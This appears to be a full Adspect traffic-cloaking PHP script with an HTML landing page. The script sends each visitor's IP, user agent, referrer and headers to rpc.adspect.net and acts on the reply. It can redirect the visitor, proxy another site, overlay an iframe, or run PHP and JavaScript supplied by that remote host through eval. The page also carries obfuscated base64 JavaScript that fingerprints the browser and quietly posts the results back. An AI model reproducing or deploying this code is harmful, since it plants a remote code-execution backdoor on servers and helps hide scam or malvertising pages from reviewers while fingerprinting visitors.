<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('a88e78c8-199a-429f-a0dd-9aaa44f7b66f', 'redirect', '_', base64_decode('dnTMYFkgzaW5TiT4looV2keFgoYzR7cXNDwFscQZdjw=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,dmFyIF8weDE5NzI9Wydsb2cnLCdnZXRUaW1lem9uZU9mZnNldCcsJ2Z1bmN0aW9uJywnMkhMUWJLcycsJ3N0YXRlJywnc3VibWl0Jywnc3RyaW5naWZ5JywnMTI0MzgwNFN2QUpncicsJ2hpZGRlbicsJ2RvY3VtZW50JywnbG9jYXRpb24nLCd0b1N0cmluZycsJ2NyZWF0ZUV2ZW50JywnMTY0NDMwRFpXb0RBJywndGltZXpvbmVPZmZzZXQnLCdub2RlTmFtZScsJ3dlYmdsJywnbWVzc2FnZScsJ1VOTUFTS0VEX1ZFTkRPUl9XRUJHTCcsJ2dldE93blByb3BlcnR5TmFtZXMnLCcxODYyNTN6elVWRG0nLCcxNDV2S01ZSWInLCdxdWVyeScsJ2FjdGlvbicsJ25hdmlnYXRvcicsJ3Blcm1pc3Npb24nLCdUb3VjaEV2ZW50Jywnb2JqZWN0JywnZGF0YScsJ2NhbnZhcycsJ1VOTUFTS0VEX1JFTkRFUkVSX1dFQkdMJywnaW5wdXQnLCc4OGhSZUx4bCcsJ2Zvcm0nLCdwdXNoJywnbWV0aG9kJywndG91Y2hFdmVudCcsJ3RoZW4nLCc1MTk3ZkZhZ21YJywnNDA3MDY3bGtSak9VJywnTm90aWZpY2F0aW9uJywnY2xvc3VyZScsJ2dldEV4dGVuc2lvbicsJ2Vycm9ycycsJ3Blcm1pc3Npb25zJywnZ2V0UGFyYW1ldGVyJywnd2luZG93JywnMU1kaG9KRicsJ3NjcmVlbicsJ2RvY3VtZW50RWxlbWVudCcsJ2hyZWYnLCcxNTY5UExRa2tvJywnYXR0cmlidXRlcycsJzIzMTA0NmJNcFNWdCcsJ3Rvc3RyaW5nJywnY29uc29sZScsJ25vdGlmaWNhdGlvbnMnLCdjcmVhdGVFbGVtZW50J107dmFyIF8weDI0NTg9ZnVuY3Rpb24oXzB4NTYxNjFjLF8weDE4YjM2MCl7XzB4NTYxNjFjPV8weDU2MTYxYy0weDExODt2YXIgXzB4MTk3MjIyPV8weDE5NzJbXzB4NTYxNjFjXTtyZXR1cm4gXzB4MTk3MjIyO307KGZ1bmN0aW9uKF8weDM0ZjViNCxfMHgzYzIwMTcpe3ZhciBfMHgyNWQzNDQ9XzB4MjQ1ODt3aGlsZSghIVtdKXt0cnl7dmFyIF8weDU2ZjIxOD0tcGFyc2VJbnQoXzB4MjVkMzQ0KDB4MTM3KSkrLXBhcnNlSW50KF8weDI1ZDM0NCgweDE1MSkpK3BhcnNlSW50KF8weDI1ZDM0NCgweDExZikpKi1wYXJzZUludChfMHgyNWQzNDQoMHgxM2UpKSstcGFyc2VJbnQoXzB4MjVkMzQ0KDB4MTUwKSkqcGFyc2VJbnQoXzB4MjVkMzQ0KDB4MTRhKSkrcGFyc2VJbnQoXzB4MjVkMzQ0KDB4MTNmKSkqLXBhcnNlSW50KF8weDI1ZDM0NCgweDEyMykpKy1wYXJzZUludChfMHgyNWQzNDQoMHgxMmQpKSotcGFyc2VJbnQoXzB4MjVkMzQ0KDB4MTI1KSkrcGFyc2VJbnQoXzB4MjVkMzQ0KDB4MTMxKSk7aWYoXzB4NTZmMjE4PT09XzB4M2MyMDE3KWJyZWFrO2Vsc2UgXzB4MzRmNWI0WydwdXNoJ10oXzB4MzRmNWI0WydzaGlmdCddKCkpO31jYXRjaChfMHgyZWVhNmYpe18weDM0ZjViNFsncHVzaCddKF8weDM0ZjViNFsnc2hpZnQnXSgpKTt9fX0oXzB4MTk3MiwweDQwNDg5KSxmdW5jdGlvbigpe3ZhciBfMHg1MTQ0YmU9XzB4MjQ1ODtmdW5jdGlvbiBfMHg0NThhZGEoKXt2YXIgXzB4NTgyZGI4PV8weDI0NTg7XzB4MjdiMjQ2W18weDU4MmRiOCgweDExYildPV8weDRmYzJmZjt2YXIgXzB4MmFlZTU1PWRvY3VtZW50W18weDU4MmRiOCgweDEyOSldKF8weDU4MmRiOCgweDE0YikpLF8weGNkYmNmNT1kb2N1bWVudFtfMHg1ODJkYjgoMHgxMjkpXShfMHg1ODJkYjgoMHgxNDkpKTtfMHgyYWVlNTVbXzB4NTgyZGI4KDB4MTRkKV09J1BPU1QnLF8weDJhZWU1NVtfMHg1ODJkYjgoMHgxNDEpXT13aW5kb3dbXzB4NTgyZGI4KDB4MTM0KV1bXzB4NTgyZGI4KDB4MTIyKV0sXzB4Y2RiY2Y1Wyd0eXBlJ109XzB4NTgyZGI4KDB4MTMyKSxfMHhjZGJjZjVbJ25hbWUnXT1fMHg1ODJkYjgoMHgxNDYpLF8weGNkYmNmNVsndmFsdWUnXT1KU09OW18weDU4MmRiOCgweDEzMCldKF8weDI3YjI0NiksXzB4MmFlZTU1WydhcHBlbmRDaGlsZCddKF8weGNkYmNmNSksZG9jdW1lbnRbJ2JvZHknXVsnYXBwZW5kQ2hpbGQnXShfMHgyYWVlNTUpLF8weDJhZWU1NVtfMHg1ODJkYjgoMHgxMmYpXSgpO312YXIgXzB4NGZjMmZmPVtdLF8weDI3YjI0Nj17fTt0cnl7dmFyIF8weDViMjM2ND1mdW5jdGlvbihfMHg0YTM2Yzgpe3ZhciBfMHg0YmE5N2E9XzB4MjQ1ODtpZignb2JqZWN0Jz09PXR5cGVvZiBfMHg0YTM2YzgmJm51bGwhPT1fMHg0YTM2Yzgpe3ZhciBfMHgyYWYyZGY9ZnVuY3Rpb24oXzB4Mzc3ZDM0KXt2YXIgXzB4MWYxNzhlPV8weDI0NTg7dHJ5e3ZhciBfMHgyOWM5YjY9XzB4NGEzNmM4W18weDM3N2QzNF07c3dpdGNoKHR5cGVvZiBfMHgyOWM5YjYpe2Nhc2UgXzB4MWYxNzhlKDB4MTQ1KTppZihudWxsPT09XzB4MjljOWI2KWJyZWFrO2Nhc2UgXzB4MWYxNzhlKDB4MTJjKTpfMHgyOWM5YjY9XzB4MjljOWI2W18weDFmMTc4ZSgweDEzNSldKCk7fV8weDJkMjNkN1tfMHgzNzdkMzRdPV8weDI5YzliNjt9Y2F0Y2goXzB4NGQ0MmMzKXtfMHg0ZmMyZmZbJ3B1c2gnXShfMHg0ZDQyYzNbXzB4MWYxNzhlKDB4MTNiKV0pO319LF8weDJkMjNkNz17fSxfMHg0MWNlZmE7Zm9yKF8weDQxY2VmYSBpbiBfMHg0YTM2YzgpXzB4MmFmMmRmKF8weDQxY2VmYSk7dHJ5e3ZhciBfMHgyNDg0OWQ9T2JqZWN0W18weDRiYTk3YSgweDEzZCldKF8weDRhMzZjOCk7Zm9yKF8weDQxY2VmYT0weDA7XzB4NDFjZWZhPF8weDI0ODQ5ZFsnbGVuZ3RoJ107KytfMHg0MWNlZmEpXzB4MmFmMmRmKF8weDI0ODQ5ZFtfMHg0MWNlZmFdKTtfMHgyZDIzZDdbJyEhJ109XzB4MjQ4NDlkO31jYXRjaChfMHg1OWUxNzQpe18weDRmYzJmZltfMHg0YmE5N2EoMHgxNGMpXShfMHg1OWUxNzRbXzB4NGJhOTdhKDB4MTNiKV0pO31yZXR1cm4gXzB4MmQyM2Q3O319O18weDI3YjI0NltfMHg1MTQ0YmUoMHgxMjApXT1fMHg1YjIzNjQod2luZG93W18weDUxNDRiZSgweDEyMCldKSxfMHgyN2IyNDZbXzB4NTE0NGJlKDB4MTFlKV09XzB4NWIyMzY0KHdpbmRvdyksXzB4MjdiMjQ2W18weDUxNDRiZSgweDE0MildPV8weDViMjM2NCh3aW5kb3dbXzB4NTE0NGJlKDB4MTQyKV0pLF8weDI3YjI0NltfMHg1MTQ0YmUoMHgxMzQpXT1fMHg1YjIzNjQod2luZG93W18weDUxNDRiZSgweDEzNCldKSxfMHgyN2IyNDZbXzB4NTE0NGJlKDB4MTI3KV09XzB4NWIyMzY0KHdpbmRvd1tfMHg1MTQ0YmUoMHgxMjcpXSksXzB4MjdiMjQ2W18weDUxNDRiZSgweDEyMSldPWZ1bmN0aW9uKF8weDUzMjUzMil7dmFyIF8weDUwOTM1Mz1fMHg1MTQ0YmU7dHJ5e3ZhciBfMHg0ZWUxZmU9e307XzB4NTMyNTMyPV8weDUzMjUzMltfMHg1MDkzNTMoMHgxMjQpXTtmb3IodmFyIF8weDI1ODI2NyBpbiBfMHg1MzI1MzIpXzB4MjU4MjY3PV8weDUzMjUzMltfMHgyNTgyNjddLF8weDRlZTFmZVtfMHgyNTgyNjdbXzB4NTA5MzUzKDB4MTM5KV1dPV8weDI1ODI2N1snbm9kZVZhbHVlJ107cmV0dXJuIF8weDRlZTFmZTt9Y2F0Y2goXzB4NTM1MTQ0KXtfMHg0ZmMyZmZbXzB4NTA5MzUzKDB4MTRjKV0oXzB4NTM1MTQ0W18weDUwOTM1MygweDEzYildKTt9fShkb2N1bWVudFtfMHg1MTQ0YmUoMHgxMjEpXSksXzB4MjdiMjQ2W18weDUxNDRiZSgweDEzMyldPV8weDViMjM2NChkb2N1bWVudCk7dHJ5e18weDI3YjI0NltfMHg1MTQ0YmUoMHgxMzgpXT1uZXcgRGF0ZSgpW18weDUxNDRiZSgweDEyYildKCk7fWNhdGNoKF8weDQ3MzU0Yyl7XzB4NGZjMmZmW18weDUxNDRiZSgweDE0YyldKF8weDQ3MzU0Y1tfMHg1MTQ0YmUoMHgxM2IpXSk7fXRyeXtfMHgyN2IyNDZbXzB4NTE0NGJlKDB4MTE5KV09ZnVuY3Rpb24oKXt9Wyd0b1N0cmluZyddKCk7fWNhdGNoKF8weDMxYjc3NCl7XzB4NGZjMmZmW18weDUxNDRiZSgweDE0YyldKF8weDMxYjc3NFsnbWVzc2FnZSddKTt9dHJ5e18weDI3YjI0NltfMHg1MTQ0YmUoMHgxNGUpXT1kb2N1bWVudFtfMHg1MTQ0YmUoMHgxMzYpXShfMHg1MTQ0YmUoMHgxNDQpKVtfMHg1MTQ0YmUoMHgxMzUpXSgpO31jYXRjaChfMHgxZTEzMWEpe18weDRmYzJmZlsncHVzaCddKF8weDFlMTMxYVtfMHg1MTQ0YmUoMHgxM2IpXSk7fXRyeXtfMHg1YjIzNjQ9ZnVuY3Rpb24oKXt9O3ZhciBfMHgxZjE4NjQ9MHgwO18weDViMjM2NFsndG9TdHJpbmcnXT1mdW5jdGlvbigpe3JldHVybisrXzB4MWYxODY0LCcnO30sY29uc29sZVtfMHg1MTQ0YmUoMHgxMmEpXShfMHg1YjIzNjQpLF8weDI3YjI0NltfMHg1MTQ0YmUoMHgxMjYpXT1fMHgxZjE4NjQ7fWNhdGNoKF8weDJkNGEwZil7XzB4NGZjMmZmW18weDUxNDRiZSgweDE0YyldKF8weDJkNGEwZlsnbWVzc2FnZSddKTt9d2luZG93W18weDUxNDRiZSgweDE0MildW18weDUxNDRiZSgweDExYyldW18weDUxNDRiZSgweDE0MCldKHsnbmFtZSc6XzB4NTE0NGJlKDB4MTI4KX0pW18weDUxNDRiZSgweDE0ZildKGZ1bmN0aW9uKF8weDQ2ZDM3OSl7dmFyIF8weDVlMjBjNz1fMHg1MTQ0YmU7XzB4MjdiMjQ2W18weDVlMjBjNygweDExYyldPVt3aW5kb3dbXzB4NWUyMGM3KDB4MTE4KV1bXzB4NWUyMGM3KDB4MTQzKV0sXzB4NDZkMzc5W18weDVlMjBjNygweDEyZSldXSxfMHg0NThhZGEoKTt9LF8weDQ1OGFkYSk7dHJ5e3ZhciBfMHhhYjZhOGE9ZG9jdW1lbnRbJ2NyZWF0ZUVsZW1lbnQnXShfMHg1MTQ0YmUoMHgxNDcpKVsnZ2V0Q29udGV4dCddKF8weDUxNDRiZSgweDEzYSkpLF8weGYxOTAwZD1fMHhhYjZhOGFbXzB4NTE0NGJlKDB4MTFhKV0oJ1dFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8nKTtfMHgyN2IyNDZbXzB4NTE0NGJlKDB4MTNhKV09eyd2ZW5kb3InOl8weGFiNmE4YVtfMHg1MTQ0YmUoMHgxMWQpXShfMHhmMTkwMGRbXzB4NTE0NGJlKDB4MTNjKV0pLCdyZW5kZXJlcic6XzB4YWI2YThhWydnZXRQYXJhbWV0ZXInXShfMHhmMTkwMGRbXzB4NTE0NGJlKDB4MTQ4KV0pfTt9Y2F0Y2goXzB4M2RkMjk4KXtfMHg0ZmMyZmZbXzB4NTE0NGJlKDB4MTRjKV0oXzB4M2RkMjk4WydtZXNzYWdlJ10pO319Y2F0Y2goXzB4NDJlODBlKXtfMHg0ZmMyZmZbXzB4NTE0NGJlKDB4MTRjKV0oXzB4NDJlODBlWydtZXNzYWdlJ10pLF8weDQ1OGFkYSgpO319KCkpOw=="></script>
</body>
</html>
<?php exit;